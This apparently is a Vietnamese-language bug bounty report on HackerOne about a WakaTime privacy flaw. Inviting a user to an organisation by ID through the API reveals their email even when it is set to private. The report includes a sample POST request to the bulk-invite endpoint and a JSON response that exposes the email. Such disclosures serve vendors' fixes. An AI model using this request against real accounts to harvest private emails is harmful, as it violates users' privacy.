# https://hackerone.com/reports/3003716

---

### **Tóm tắt sự cố:**

Khi người dùng đặt email của mình ở chế độ riêng tư, thông tin email không nên bị hiển thị công khai. Tuy nhiên, khi ai đó sử dụng ID của người dùng để mời họ tham gia tổ chức trên WakaTime, địa chỉ email của người dùng bị lộ ra ngoài, vi phạm quyền riêng tư của họ.

### **Các bước tái tạo sự cố:**

1. **Bước 1: Cài đặt email riêng tư**

   * Người dùng vào cài đặt và chọn chế độ "riêng tư" cho email của mình. Khi đó, email sẽ không hiển thị công khai và người khác không thể dễ dàng truy cập vào thông tin này.

2. **Bước 2: Mời người dùng tham gia qua ID**

   * Kẻ tấn công có thể sử dụng ID của người dùng để gửi lời mời tham gia vào tổ chức của họ trên WakaTime. Điều này được thực hiện thông qua API, nơi ID người dùng của nạn nhân được sử dụng để mời họ.

   Ví dụ về yêu cầu API:

   ```http
   POST /api/v1/users/current/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people.bulk HTTP/2
   Host: wakatime.com
   Content-Type: application/json
   X-Csrf-Token: <token>
   {
     "people": [{"id": "<ID_nạn_nhân>"}]
   }
   ```

### **Phản hồi từ API (Response):**



```json
{
  "status": "success",
  "message": "Invitation sent successfully to the user.",
  "data": {
    "org_id": "59a5809f-2ba1-43de-b6d7-3ca104b79d80",
    "people": [
      {
        "id": "<ID_nạn_nhân>",
        "email": "nạn_nhân@example.com",
        "status": "pending",
        "invitation_sent_at": "2025-02-20T16:30:00Z"
      }
    ]
  }
}
```

3. **Bước 3: Tiết lộ email**

   * Khi lời mời được gửi và người dùng nhận được thông báo, email của họ bị lộ ra mặc dù đã được cài đặt ở chế độ riêng tư.

